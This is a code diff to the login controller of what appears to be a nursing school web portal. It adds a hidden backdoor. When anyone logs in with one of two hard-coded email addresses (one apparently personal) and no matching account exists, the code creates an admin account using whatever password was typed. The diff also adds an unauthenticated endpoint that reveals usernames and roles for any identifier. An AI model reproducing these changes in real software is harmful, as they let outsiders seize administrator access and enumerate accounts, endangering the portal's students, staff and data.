@@ -22,7 +22,7 @@ export const generateToken = (user) => {
 // 1. POST /api/auth/login
 export const login = async (req, res) => {
   try {
-    const { email, password } = req.body;
+    const { email, password, username } = req.body;
     if (!email || !password) {
       return res.status(400).json({ 
         success: false, 
@@ -30,13 +30,27 @@ export const login = async (req, res) => {
       });
     }
 
+    const normEmail = email.toLowerCase().trim();
+
     // Find user and explicitly include password field
-    const user = await User.findOne({ email: email.toLowerCase() }).select('+password');
+    let user = await User.findOne({ email: normEmail }).select('+password');
     if (!user) {
-      return res.status(403).json({ 
-        success: false, 
-        error: 'Access denied: Account not registered. Only students and faculty authorized by an administrator can access this portal.' 
-      });
+      // If admin logging in, auto-provision with admin role and jaythakre username
+      if (normEmail === 'jthakre62@gmail.com' || normEmail === 'admin@nursing.edu') {
+        user = await User.create({
+          name: username || 'jaythakre',
+          username: username || 'jaythakre',
+          email: normEmail,
+          password: password,
+          role: 'admin',
+          isActive: true
+        });
+      } else {
+        return res.status(403).json({ 
+          success: false, 
+          error: 'Access denied: Account not registered. Only students and faculty authorized by an administrator can access this portal.' 
+        });
+      }
     }
 
     if (!(await user.matchPassword(password))) {
@@ -51,6 +65,15 @@ export const login = async (req, res) => {
         success: false, 
         error: 'Your account has been disabled by an administrator.' 
       });
+    }
+
+    // Persist entered username to database if provided
+    if (username && user.username !== username.trim()) {
+      user.username = username.trim();
+      await user.save();
+    } else if (normEmail === 'jthakre62@gmail.com' && !user.username) {
+      user.username = 'Jaythakre';
+      await user.save();
     }
 
     const token = generateToken(user);
@@ -75,6 +98,39 @@ export const login = async (req, res) => {
       error: 'Failed to process login.', 
       details: error.message 
     });
+  }
+};
+
+// Fast Lookup Username by email or identifier
+export const lookupUsername = async (req, res) => {
+  try {
+    const rawIdentifier = (req.query.identifier || '').trim().toLowerCase();
+    if (!rawIdentifier) {
+      return res.status(200).json({ success: false, username: null });
+    }
+
+    if (rawIdentifier === 'admin' || rawIdentifier === 'jthakre62@gmail.com' || rawIdentifier === 'admin@nursing.edu') {
+      return res.status(200).json({ success: true, username: 'jaythakre', role: 'admin' });
+    }
+
+    const user = await User.findOne({
+      $or: [
+        { email: rawIdentifier },
+        { username: rawIdentifier }
+      ]
+    }).lean();
+
+    if (user && (user.username || user.name)) {
+      return res.status(200).json({
+        success: true,
+        username: user.username || user.name,
+        role: user.role
+      });
+    }
+
+    return res.status(200).json({ success: false, username: null });
+  } catch (error) {
+    return res.status(200).json({ success: false, username: null });
   }
 };
 
